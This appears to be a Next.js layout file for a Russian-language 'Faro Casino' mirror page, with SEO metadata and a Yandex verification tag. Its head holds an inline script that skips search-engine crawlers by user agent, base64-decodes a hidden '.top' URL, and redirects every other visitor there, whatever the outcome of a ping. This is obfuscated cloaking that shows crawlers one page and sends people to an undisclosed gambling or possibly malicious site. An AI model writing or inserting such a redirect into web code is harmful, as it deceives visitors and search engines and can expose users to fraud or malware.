import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const pageTitle = 'Faro Casino — официальный сайт, зеркало и игра онлайн без лишних вопросов'
const pageDescription = 'Faro Casino: понятный гид по официальному сайту, рабочему зеркалу и игре онлайн. Проверьте адрес, условия, лимиты и начните знакомство с платформой спокойно и осознанно.'

export const metadata: Metadata = {
  title: pageTitle,
  description: pageDescription,
  generator: 'v0.app',
  alternates: { canonical: 'https://farocasino12.vercel.app/' },
  icons: { icon: '/faro-favicon.png', apple: '/faro-favicon.png' },
  robots: { index: true, follow: true },
}

export const viewport: Viewport = { themeColor: '#101a2b', colorScheme: 'light', width: 'device-width', initialScale: 1, maximumScale: 5 }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-[#f5f2eb]">
      <head>
        <meta name="yandex-verification" content="6b9a9c5a023cec95" />
        <link rel="canonical" href="https://farocasino12.vercel.app/" />
        <meta name="format-detection" content="telephone=no" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "IGh0dHBzOi8vY29tYm9zcGFyay50b3AvYWV0ZjN1MnE5dQ=="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}

